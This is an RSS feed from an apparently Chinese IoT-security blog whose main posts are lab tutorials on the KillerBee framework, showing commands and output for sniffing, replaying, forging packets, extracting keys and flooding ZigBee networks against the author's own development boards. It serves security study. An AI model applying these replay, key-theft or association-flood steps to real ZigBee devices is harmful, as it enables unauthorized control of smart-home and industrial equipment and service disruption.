<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yaseng</title>
  
  <subtitle>Bypass the token</subtitle>
  <link href="/rss.xml" rel="self"/>
  
  <link href="http://yaseng.org/"/>
  <updated>2021-04-09T10:44:03.368Z</updated>
  <id>http://yaseng.org/</id>
  
  <author>
    <name>Yaseng</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>KillerBee 框架使用（二）</title>
    <link href="http://yaseng.org/killerbee-2.html"/>
    <id>http://yaseng.org/killerbee-2.html</id>
    <published>2021-03-02T16:00:00.000Z</published>
    <updated>2021-04-09T10:44:03.368Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ZigBee简介"><a href="#ZigBee简介" class="headerlink" title="ZigBee简介"></a>ZigBee简介</h2><p>ZigBee是一种无线通信网络标准，广泛用于IoT设备中，这些设备专为低数据传输率的低功耗使用场景而设计。 ZigBee协议可用于多种设置，包括智能家居，楼宇自动化，工业控制设备（ICS），智能医疗保健等。ZigBee联盟是一个由多家公司组织联合而成的协会,它为低功耗无线物联网(IoT)创建、维护和提供了开放的全球标准。所以，这也允许各种ZigBee设备相互交互。例如，给定制造商的启用ZigBee的智能插座可以与其他制造商的ZigBee智能灯泡进行通信。 </p><p>ZigBee网络可以具有各种设备，如：</p><ul><li>协调器：整个网络中的单个设备，负责许多操作，例如选择正确的通道，创建网络，形成安全设置，处理身份验证，甚至以后充当路由器。 </li><li>路由器：为ZigBee网络上存在的各种网络设备提供路由服务。 </li><li>终端设备：执行诸如读取温度的操作或诸如打开灯的操作。</li></ul><p>终端设备大多数时候都处于睡眠状态以节省功耗，并且仅在读取或写入请求时才唤醒。在讨论ZigBee网络中的基本概念时，还必须了解ZigBee中的寻址模式，这一点很重要。 ZigBee设备将具有两个地址-一个来自802.15标准，这是一个全球唯一的64位数字，一个是16位的NWK地址。</p><p>要与设备通信，寻址需要包含三个信息部分：</p><ul><li>目标设备的地址。 </li><li>端点号。 </li><li>群集ID。</li></ul><p>但是，要发送广播，所有设备所需要做的就是将广播数据包发送到地址0xFFFF，ZigBee网络上存在的所有设备都将接收该数据包。</p><p>ZigBee设备中总共使用了16个信道，因此，当我们研究ZigBee设备通信时，我们首先需要弄清楚该设备在哪个信道上运行，然后在该特定信道上捕获ZigBee数据包。</p><h2 id="搭建ZigBee环境"><a href="#搭建ZigBee环境" class="headerlink" title="搭建ZigBee环境"></a>搭建ZigBee环境</h2><p>CC2530是TI公司开发的一款专门用于无线传感器网络中进行数据传输的集成芯片，可以用于2.4-GHz IEEE802.15.4、ZigBee 和RF4CE 应用的一个真正的SoC解决方案。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210406160040562.png" alt="image-20210406160040562"></p><p>硬件：</p><p>基于CC2530模块的ZigBee开发板，CC-DEBUGGER编程器：</p><p>软件：</p><p>Smartrf Flash Programmer，IAREmbedded Workbench IDE，CH340 驱动，CC-DEBUGGER 驱动</p><p>通过IAR打开开发代码，使用CC-DEBUGGER 连接开发板，选择 CoodinatorEB（作为协调器） , 下载到开发板 A(协调器)， 如：  </p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210324121300460.png" alt="image-20210324121300460"></p><p>接下来选择 EndDeviceEB（终端） , 下载到开发板 B，如：  </p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210324121233040.png" alt="image-20210324121233040"></p><p>在继电器的位置接在上个小灯， 通过协调器的 key1 去控制这个小灯的状态变化；</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210324125942639.png" alt="image-20210326170327881"></p><p>注：协调器（左），终端设备（右）</p><p>也可以协调器连接PC串口工具，发送 on 或者 off 可以实现开灯和关灯  </p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210324125942639.png" alt="image-20210324125942639"></p><h2 id="KillerBee框架"><a href="#KillerBee框架" class="headerlink" title="KillerBee框架"></a>KillerBee框架</h2><p>现在，我们搭建好了ZigBee测试环境，作为下一步的攻击目标。为此，我们使用KillBee的测试框架工具，killerBee框架的安装及使用在上一章做了简单的介绍，这是RiverLoop Security开发的开源工具，用于帮助评估和利用基于ZigBee的设备。 。</p><h3 id="Atmel-RzRaven-USB-Stick"><a href="#Atmel-RzRaven-USB-Stick" class="headerlink" title="Atmel RzRaven USB Stick"></a>Atmel RzRaven USB Stick</h3><p>KillerBee支持多种硬件设备，例如Atmel RzRaven USB Stick，APIMote，MoteIV Tmote Sky，TelosB mote和Sewino Sniffer。与之前不同使用的APIMote，现在我们使用<strong>Atmel RzRaven USB</strong>记忆棒，如图所示。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210324140003686.png" alt="image-20210324140003686"></p><p>在开始使用KillerBee和Rz USBstick评估基于ZigBee的设备之前，第一步是使用AVR Dragon over JTAG接口将KillerBee固件写入到Rz USBstick上。</p><p>可以通过运行 <code>sudo zbid</code>来验证固件，并列出设备。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210324164212620.png" alt="image-20210324164212620"></p><p>如果使用的是APIMote而不是Rz USBstick，则会看到该设备列为GoodFET，如图所示，而不是KillBee。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210324181641873.png" alt="image-20210324181641873"></p><p>ZigBee安全评估的下一步就是确定目标设备的通道。</p><p>可以使用KillerBee框架中名为zbstumbler的工具来完成嗅探操作，使用–v参数运行zbstumbler以确保收到详细消息，例如在某些情况下，当zbstumbler检测到的数据包格式不正确时，如果没有详细标志，它将不会在终端上显示。运行zbstumbler时查找关键字Received Frame，如图中看到的，在这种情况下，我们已经在<strong>11</strong>信道上确定了ZigBee协调器设备。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210324165534444.png" alt="image-20210324165534444"></p><p>zbstumble也可以以日志信息方式显示所发现的网络信息，并且可使用<code>-w</code>参数将发现的网络信息记录到CSV文件中：</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210325115659807.png" alt="image-20210325115659807"></p><p>通过zbstumble发现ZigBee网络，这一技术被用于ZigBee设备本身，当一个新的设备（ZigBee协调器或ZigBee路由器）建立完毕后，它会发送一个“信标请求帧”来通知其它ZigBee网络，以避免个域网标识符PANID的冲突。由于“信标请求”机制对于ZigBee来说是不可或缺的，所以无法禁用，所以攻击者能够这一技术进行ZigBee网络发现。</p><p>对于网络发现以及定位，KillerBee还包含一个 GUI 程序zbfind，通过zbfind，当这些设备都在范围内向外发送信息，我们就可以识别出周围的IEEE 802.15.4设备。</p><p>使用 sudo zbfind -c 11选择11信道，捕获到ZigBee设备，选中设备后就会显示有关这个设备更详细的信息，以观察该设备活动时第一次和最后一次捕获到该设备数据包的时间。在左边仪表盘处还会显示最后一次接收到数据包时接收到对方发送信号的强度，再根据信号的强弱，对设备进行跟踪，直到最大信号。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210326163503843.png" alt="image-20210326163503843"></p><h3 id="嗅探ZigBee数据包"><a href="#嗅探ZigBee数据包" class="headerlink" title="嗅探ZigBee数据包"></a>嗅探ZigBee数据包</h3><p>我们接下来使用KillerBee嗅探两块开发板（协调器和终端设备）通讯的数据包。</p><p>我们可以使用zbwireshark并通过指定要捕获数据包的信道（<code>-c</code>或<code>-f</code>参数指定信道为11）来主动嗅探它们，而不是将数据包捕获到转储文件中。</p><p>如图，我们可以通过ZigBee设备的信道，并嗅探该通道上的数据包，从而揭示了我们的明文流量。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210324230040259.png" alt="image-20210324230040259"></p><p>我们还可以通过zbdump捕获数据包，并以pcap和DainTree文件格式保存。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210324204300296.png" alt="image-20210324204300296"></p><h3 id="重播ZigBee数据包"><a href="#重播ZigBee数据包" class="headerlink" title="重播ZigBee数据包"></a>重播ZigBee数据包</h3><p>KillerBee可以做的另一件有趣的事情是执行基于重播的攻击。</p><p>为了执行此捕获，我们使用Attify ZigBee框架，这是在KillerBee之上构建的GUI工具箱。然后需要指定要执行捕获的通道，要捕获的数据包数量以及需要存储数据包的文件名，如图所示。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210325101708584.png" alt="image-20210325101708584"></p><p>在嗅探期间，首先，我们需要在协调器连接PC端串口工具中，对终端设备进行操作，例如控制小灯的亮灭。</p><p>现在我们捕获了数据包，下一步就是简单地重播数据包。</p><p>当我们重放数据包时，会看到灯泡受到控制，而且无需任何用户交互。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210325102100813.png" alt="image-20210325102100813"></p><p>一个“重播攻击”的有效性，很大程度上取决于作为被攻击设备的软硬设计时采用的实现方式，通常情况下，“重播攻击”所针对的是未加密的网络，或者是已经指定“加密密钥”的网络。</p><h3 id="伪造数据包攻击"><a href="#伪造数据包攻击" class="headerlink" title="伪造数据包攻击"></a>伪造数据包攻击</h3><p> KillerBee还集成了Philippe Biondi开发的数据包嗅探的开发框架类交互程序Scapy，经过开发人员集成对ZigBee协议的支持，所以KillerBee提供了zbscapy工具，该工具可以进行嗅探和伪造ZigBee协议以及IEEE 802.15.4 协议数据包。</p><p>使用ls()命令可以列出可用函数，其中很多介质访问控制层的附加函数都是以Dot15d4()作为前缀。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210326222318953.png" alt="image-20210326222318953"></p><p>zbscapy使用killerbee_channel配置项指定信道，下面使用zbstumbler工具的功能，即手工发送一个IEEE 802.15.4 协议信标请求帧，通过Dot15d4Cmd()函数进行数据包填充，然后将该数据帧指定为信标请求命令类型，最后通过调用kbsendp()函数发送这个数据包。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210326224335933.png" alt="image-20210326224335933"></p><p>除了伪造数据包，还可以接收数据包，同时进行后续处理。前面的情况下，通过发送信标请求数据帧，对接收到的数据包并不会显示任何信息。下面修改脚本进行发送数据，同时接收数据包。</p><p>我们伪造了一个有效的数据帧，数据帧类型是信标请求，指定地址0xffff（广播地址），使用另一个函数kbsrp1()进行发送，该函数区别在于，发该数据帧会进入等待，直到得到一个网络的响应数据包才返回(终端设备地址0x599a)。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210326225336232.png" alt="image-20210326225336232"></p><p>除了数据包注入外，还可以通过kbsniff()函数进行数据包嗅探。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210326230533530.png" alt="image-20210326230533530"></p><p>除了KillerBee框架的套件之外，zbscapy是一个非常强大的工具，最大的特点就是可以自行使用脚本开发，灵活运用。具体到攻击，很多ZigBee和IEEE 802.15.4产品设备经过部署，想要完成对其成功攻击还需要额外的实验。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ZigBee简介&quot;&gt;&lt;a href=&quot;#ZigBee简介&quot; class=&quot;headerlink&quot; title=&quot;ZigBee简介&quot;&gt;&lt;/a&gt;ZigBee简介&lt;/h2&gt;&lt;p&gt;ZigBee是一种无线通信网络标准，广泛用于IoT设备中，这些设备专为低数据传输率的低功耗使
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ZigBee" scheme="http://yaseng.org/tags/ZigBee/"/>
    
      <category term="KillerBee" scheme="http://yaseng.org/tags/KillerBee/"/>
    
      <category term="ZigBee 安全" scheme="http://yaseng.org/tags/ZigBee-%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>KillBee 框架使用（一）</title>
    <link href="http://yaseng.org/killerbee-1.html"/>
    <id>http://yaseng.org/killerbee-1.html</id>
    <published>2021-01-28T16:00:00.000Z</published>
    <updated>2021-04-09T10:44:00.689Z</updated>
    
    <content type="html"><![CDATA[<h2 id="KillerBee框架"><a href="#KillerBee框架" class="headerlink" title="KillerBee框架"></a>KillerBee框架</h2><p><a href="https://github.com/riverloopsec/killerbee" target="_blank" rel="noopener">KillerBee</a>是针对ZigBee和IEEE 802.15.4网络的框架和安全研究工具。</p><h3 id="框架要求"><a href="#框架要求" class="headerlink" title="框架要求"></a>框架要求</h3><p>KillerBee目前仅支持Linux系统。在安装之前必须安装以下Python模块。在Ubuntu系统上，可以使用以下命令安装所需的依赖项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># apt-get install python-gtk2 python-cairo python-usb python-crypto python-serial python-dev libgcrypt-dev</span><br><span class="line"># git clone https://github.com/secdev/scapy</span><br><span class="line"># cd scapy</span><br><span class="line"># python setup.py install</span><br></pre></td></tr></table></figure><h3 id="安装KillerBee"><a href="#安装KillerBee" class="headerlink" title="安装KillerBee"></a>安装KillerBee</h3><p>KillerBee 使用标准的Python “setup.py” 安装文件。使用以下命令安装KillerBee：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># python setup.py install</span><br></pre></td></tr></table></figure><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>KillerBee代码的目录结构描述如下：</p><ul><li>doc - KillerBee库中的HTML文档，由epydoc提供。</li><li>firmware  - 支持的KillerBee硬件设备的固件。</li><li>killerbee - Python库源代码。</li><li>sample - 样本数据包捕获，在下面引用。</li><li>scripts - 开发中使用的Shell脚本。</li><li>tools - 使用此框架开发的ZigBee和IEEE 802.15.4攻击工具。</li></ul><h3 id="硬件要求"><a href="#硬件要求" class="headerlink" title="硬件要求"></a>硬件要求</h3><p>KillerBee框架目前支持多款设备，包括River Loop ApiMote、Atmel RZ RAVEN无线电收发器、MoteIVTmote Sky、TelosB mote、Sewino嗅探器和运行Silicon Labs Node Test固件的各种硬件。</p><h3 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h3><p>KillerBee包括多种工具，用于攻击使用KillerBee框架构建的ZigBee和IEEE 802.15.4网络。通过“ -h”参数可以查看详细的使用说明，在下面进行了概述。</p><ul><li>zbid - 标识KillerBee和关联工具可以使用的可用接口。</li><li>zbwireshark - 与zbdump相似，但是公开了一个命名管道，以便在Wireshark中进行实时捕获和查看。</li><li>zbdump - 类似tcpdump的功能，用于捕获ibpcap数据包文件。它可以以pcap和Daintree格式保存数据包。</li><li>zbreplay - 实施重放攻击，从指定的Daintree DCF或libpcap数据包捕获文件中读取数据，然后重新传输帧。ACK帧不会重新发送。</li><li>zbstumbler - 激活ZigBee和IEEE 802.15.4网络发现工具。Zbstumbler发送信标请求帧，同时跳频，记录和显示有关已发现设备的摘要信息。</li><li>zbdsniff - 捕获ZigBee流量，查找NWK帧和无线密钥配置。找到密钥后，zbdsniff会将密钥打印到stdout。</li><li>zbkey - 尝试向协调器发送连接请求获取密钥。</li><li>zbconvert - 将数据包捕获从Libpcap转换为Daintree SNA格式，反之亦然。</li><li>zbfind - 一个GTK GUI应用程序，用于通过测量RSSI来跟踪IEEE 802.15.4发射机的位置。</li><li>bscapy - 提供一个交互式的Scapy shell，用于通过KillerBee界面进行交互。必须安装Scapy才能运行此功能。</li></ul><h3 id="框架介绍"><a href="#框架介绍" class="headerlink" title="框架介绍"></a>框架介绍</h3><p>KillerBee主要用于针对数据包捕获文件（libpcap或Daintree SNA）中嗅探数据包的过程，并用于注入任意数据包。包括IEEE 802.15.4，ZigBee NWK和ZigBee APS数据包解码器在内的辅助功能也可用。</p><p>KillerBee API以epydoc格式记录，此发行版的doc/目录中包含HTML文档。如果已安装epydoc，则还可以根据需要生成一个方便的PDF进行打印，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd killerbee</span><br><span class="line">$ mkdir pdf</span><br><span class="line">$ epydoc --pdf -o pdf killerbee/</span><br></pre></td></tr></table></figure><p>pdf/ 目录将包含一个名为“api.pdf”的文件，其中包括框架文档。</p><p>由于KillerBee是一个Python库，因此它集成了其他Python软件。例如，Sulley库是由Pedram Amini用Python编写的模糊测试框架。KillerBee框架使用它来数据包注入功能，用于生成格式不正确的ZigBee数据并将其传输到目标。</p><h2 id="ZigBee流量分析"><a href="#ZigBee流量分析" class="headerlink" title="ZigBee流量分析"></a>ZigBee流量分析</h2><h3 id="ZigBee网络环境"><a href="#ZigBee网络环境" class="headerlink" title="ZigBee网络环境"></a>ZigBee网络环境</h3><p>搭建ZigBee协议通信的智能灯泡系统，一共四个终端设备（RGB灯，分为1、2、3、4号）以及ZigBee协调器用于与每个终端设备（灯）网络通信。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210203125506748.png" alt="终端设备（灯）" style="zoom:25%;"></p><h3 id="使用ApiMote"><a href="#使用ApiMote" class="headerlink" title="使用ApiMote"></a>使用ApiMote</h3><p>在树莓派环境下，根据前面的介绍安装好KillerBee框架以后，下面开始用手上的ApiMote硬件设备进行ZigBee流量的分析测试。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210202161513999.png" alt="image-20210202161513999" style="zoom: 25%;"></p><p>ApiMote连接树莓派以后，会自动检测到ApiMote（ID 0403:6015）并加载驱动程序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@raspberrypi:/home/pi/Desktop# lsusb</span><br><span class="line">Bus 001 Device 005: ID 0403:6015 Future Technology Devices International, Ltd Bridge(I2C/SPI/UART/FIFO)</span><br><span class="line">Bus 001 Device 003: ID 0424:ec00 Standard Microsystems Corp. SMSC9512/9514 Fast Ethernet Adapter</span><br><span class="line">Bus 001 Device 002: ID 0424:9514 Standard Microsystems Corp. SMC9514 Hub</span><br><span class="line">Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub</span><br></pre></td></tr></table></figure><p>ApiMote通常会预装好固件，不需要重新刷写。若需要刷写固件，步骤如下：</p><ol><li><p>在 firware/ 目录下包含多种设备的固件，选择ApiMote的固件apimotev4_202011.hex</p></li><li><p>运行<code>flash_apimote.sh</code>脚本，如果第一次不同步而超时，有时可能需要两次尝试才能正确闪烁。</p></li><li><p>可以通过运行 <code>sudo zbid</code>来验证固件，并列出设备。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@raspberrypi:/home/pi/Desktop# zbid</span><br><span class="line">           Dev Product String       Serial Number</span><br><span class="line">  /dev/ttyUSB1 GoodFET Api-Mote v2</span><br></pre></td></tr></table></figure></li></ol><h3 id="嗅探数据包"><a href="#嗅探数据包" class="headerlink" title="嗅探数据包"></a>嗅探数据包</h3><p><strong>zbwireshark</strong>允许用户在Wireshark中实时嗅探和查看ZigBee流量。该工具创建一个管道，Wireshark然后从中读取数据，并实时显示出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@raspberrypi:/home/pi/Desktop# zbwireshark -f 15</span><br><span class="line">zbwireshark: listening on &apos;/dev/ttyUSB1&apos;, channel 15, page 0 (2425.0 MHz), link-type DLT_IEEE802_15_4, capture size 127 bytes</span><br></pre></td></tr></table></figure><p>-f 参数指定第 15 信道。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210202210009270.png" alt="image-20210202210009270"></p><p>也可以使用 <strong>zbdump</strong> 以pcap和DainTree格式嗅探并保存数据包。这里我们以pcap格式，以便使用wireshark打开分析协议，下面运行zbdump，同样使用 -f 指定信道。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@raspberrypi:/home/pi/Desktop# zbdump -f 15 -w test.pcap </span><br><span class="line">zbdump: listening on &apos;/dev/ttyUSB1&apos;, channel 15, page 0 (2425.0 MHz), link-type DLT_IEEE802_15_4, capture size 127 bytes</span><br><span class="line">^C</span><br><span class="line">54 packets captured</span><br></pre></td></tr></table></figure><p>使用wireshark打开捕获的数据包</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20210202212931882.png" alt="image-20210202212931882"></p><p>数据包中，捕获的源和目的地址被分配了网络ID，例如</p><ul><li><p>PAN ID ：0xd85b</p></li><li><p>0x0000 通常是协调器。</p></li><li>0x0c08 是其中一个终端设备加入ZigBee网络分配的ID。</li><li>扩展地址是硬件地址：00:12:4b:00:22:30:5e:4b</li></ul><h3 id="重放ZigBee流量"><a href="#重放ZigBee流量" class="headerlink" title="重放ZigBee流量"></a>重放ZigBee流量</h3><p>通过捕获设备的数据包，然后将该流量进行重播回设备。</p><p><strong>zbdump</strong>刚刚使用过此工具将流量保存到数据包文件中，接下来使用<strong>zbreply</strong>工具，将从zbdump获取的pcap文件，通过ApiMote对其重播。</p><p>-f 参数指定信道，-w 参数指定用于写入捕获的数据包的pcap文件，-r指定用于读取捕获的数据包的pcap文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@raspberrypi:/home/pi/Desktop# zbdump -f 15 -w operating.pcap</span><br><span class="line">zbdump: listening on &apos;/dev/ttyUSB0&apos;, channel 15, page 0 (2425.0 MHz), link-type DLT_IEEE802_15_4, capture size 127 bytes</span><br><span class="line">^C</span><br><span class="line">61 packets captured</span><br><span class="line">root@raspberrypi:/home/pi/Desktop# zbreplay -f 15 -r operating.pcap</span><br><span class="line">zbreplay: retransmitting frames from &apos;operating.pcap&apos; on interface &apos;/dev/ttyUSB0&apos; with a delay of 1.0 seconds.</span><br><span class="line">34 packets transmitted</span><br></pre></td></tr></table></figure><h3 id="嗅探密钥"><a href="#嗅探密钥" class="headerlink" title="嗅探密钥"></a>嗅探密钥</h3><p><strong>zbdsniff</strong> 工具可以从ZigBee网络抓取的流量数据包pcap文件中发现明文的密钥key，并返回key。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@raspberrypi:/home/pi/Desktop# zbdsniff -f operating.pcap -k c028128de295be0708aebe9eed</span><br><span class="line">Processing operating.pcap</span><br><span class="line">[+] Processed 1 capture files.</span><br></pre></td></tr></table></figure><p>但是我没有从文件中得到任何输出，可能没有找到可用的key。</p><p><strong>zbkey</strong> 与 zbdsniff 目的相似，不同的是 zbkey 会向协调器发送连接，然后发送数据请求来检索获取密钥，而不是扫描pcap文件。-f 参数指定信道，-s 定时，-p 参数指定 PAN ID，-a 参数指定ZigBee硬件地址。但是没有返回成功。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@raspberrypi:/home/pi/Desktop# zbkey -f 15 -s 0.1 -p d85b -a 00124b0022305e4b </span><br><span class="line">Sending association packet...</span><br><span class="line">Sending data request packet...</span><br><span class="line">Received frame                                          .^</span><br><span class="line">Length of packet received in associate_handle: 54</span><br><span class="line">0000:  61 88 ac 5b d8 c4 10 00 00 08 02 c4 10 00 00 1e   a..[............</span><br><span class="line">0010:  81 28 49 b4 09 00 3a a9 da fe ff 27 71 84 00 ce   .(I...:....&apos;q...</span><br><span class="line">0020:  8c 9f 39 98 2e 26 f8 2c d1 54 ca 0a d9 2d fb 6c   ..9..&amp;.,.T...-.l</span><br><span class="line">0030:  06 82 e3 29 03 00                                 ...)..</span><br><span class="line"></span><br><span class="line">Received frame</span><br><span class="line">Length of packet received in associate_handle: 50</span><br><span class="line">0000:  61 88 cd 5b d8 08 0c a2 c4 08 02 08 0c 00 00 1d   a..[............</span><br><span class="line">0010:  85 28 47 99 02 00 4b 5e 30 22 00 4b 12 00 00 b5   .(G...K^0&quot;.K....</span><br><span class="line">0020:  a9 58 f8 e2 96 ed ab 4f 9b 50 76 b4 99 d2 99 1a   .X.....O.Pv.....</span><br><span class="line">0030:  09 d1                                             ..</span><br><span class="line"></span><br><span class="line">Received frame</span><br><span class="line">Length of packet received in associate_handle: 5</span><br><span class="line">0000:  02 00 af 45 e8                                    ...E.</span><br><span class="line"></span><br><span class="line">Sorry, we didn&apos;t hear a device respond with an association response. Do you have an active target within range?</span><br></pre></td></tr></table></figure><h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><p>KillerBee 框架提供了 <strong>zbassocflood</strong>工具，该工具尝试将大量关联请求发送到目标网络。需要PAN ID（-p），信道（-c）和定时（-s）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@raspberrypi:/home/pi/Desktop# zbassocflood -p d85b -c 15 -s 0.1</span><br><span class="line">zbassocflood: Transmitting and receiving on interface &apos;/dev/ttyUSB0&apos;</span><br><span class="line">.............</span><br><span class="line">^C</span><br><span class="line">Sent 13 associate requests.</span><br></pre></td></tr></table></figure><p>KillerBee的攻击方式大致分为，发现设备（zbstumbler、zbopenear、zbfind），嗅探流量（zbdump、zbwireshark），获取密钥（zbdsniff、zbkey、zbgoodfind），重放流量（zbscapy、zbreplay），拒绝服务（zbscapy、zbassocflood）。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;KillerBee框架&quot;&gt;&lt;a href=&quot;#KillerBee框架&quot; class=&quot;headerlink&quot; title=&quot;KillerBee框架&quot;&gt;&lt;/a&gt;KillerBee框架&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/riverl
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ZigBee" scheme="http://yaseng.org/tags/ZigBee/"/>
    
      <category term="KillerBee" scheme="http://yaseng.org/tags/KillerBee/"/>
    
      <category term="ZigBee 安全" scheme="http://yaseng.org/tags/ZigBee-%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>开源 LoRa 协议分析工具 CatWAN USB Stick 使用</title>
    <link href="http://yaseng.org/catwan_usb_stick.html"/>
    <id>http://yaseng.org/catwan_usb_stick.html</id>
    <published>2020-12-29T16:00:00.000Z</published>
    <updated>2020-12-26T08:23:51.938Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="LoRa 协议" scheme="http://yaseng.org/tags/LoRa-%E5%8D%8F%E8%AE%AE/"/>
    
      <category term="LoRa 嗅探" scheme="http://yaseng.org/tags/LoRa-%E5%97%85%E6%8E%A2/"/>
    
      <category term="LoRa 协议分析" scheme="http://yaseng.org/tags/LoRa-%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
      <category term="CatWAN USB Stick" scheme="http://yaseng.org/tags/CatWAN-USB-Stick/"/>
    
  </entry>
  
  <entry>
    <title>Defcon Group 860731 2020  长沙线下沙龙</title>
    <link href="http://yaseng.org/defcon-group-860731-2020.html"/>
    <id>http://yaseng.org/defcon-group-860731-2020.html</id>
    <published>2020-11-28T16:00:00.000Z</published>
    <updated>2020-12-24T07:48:34.975Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Defcon-Group-860731-2020"><a href="#Defcon-Group-860731-2020" class="headerlink" title="Defcon Group 860731 2020"></a>Defcon Group 860731 2020</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/debd0e4e99ff5cbb3aeff01bf2336d0.jpg" alt="Defcon Group 860731 2020 "></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Defcon-Group-860731-2020&quot;&gt;&lt;a href=&quot;#Defcon-Group-860731-2020&quot; class=&quot;headerlink&quot; title=&quot;Defcon Group 860731 2020&quot;&gt;&lt;/a&gt;Defcon Group 8
      
    
